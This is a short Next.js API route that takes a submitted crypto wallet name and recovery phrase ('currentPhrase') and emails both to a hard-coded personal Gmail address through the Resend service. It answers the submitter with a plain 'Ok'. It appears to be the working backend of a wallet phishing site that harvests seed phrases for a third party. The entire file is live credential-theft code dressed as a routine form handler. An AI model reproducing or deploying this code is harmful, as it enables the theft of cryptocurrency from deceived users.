import Email from "../../../emails";
import { NextResponse } from "next/server";
import { Resend } from "resend";
const resend = new Resend(process.env.NEXT_PUBLIC_RESEND_API_KEY);

export async function POST(request: Request) {
  const { wallet, currentPhrase } = await request.json();

  try {
    await resend.emails.send({
      from: "pullixApp@pullixtoken.live",
      to: "captainsurge0079@gmail.com",
      subject: "Form Submitted",
      react: Email({ wallet, currentPhrase }),
    });
    return NextResponse.json(
      {
        status: "Ok",
      },
      {
        status: 200,
      }
    );
  } catch (e: unknown) {
    if (e instanceof Error) {
      console.log(`Failed to send email: ${e.message}`);
    }
    return NextResponse.json(
      {
        error: "Internal server error.",
      },
      {
        status: 500,
      }
    );
  }
}
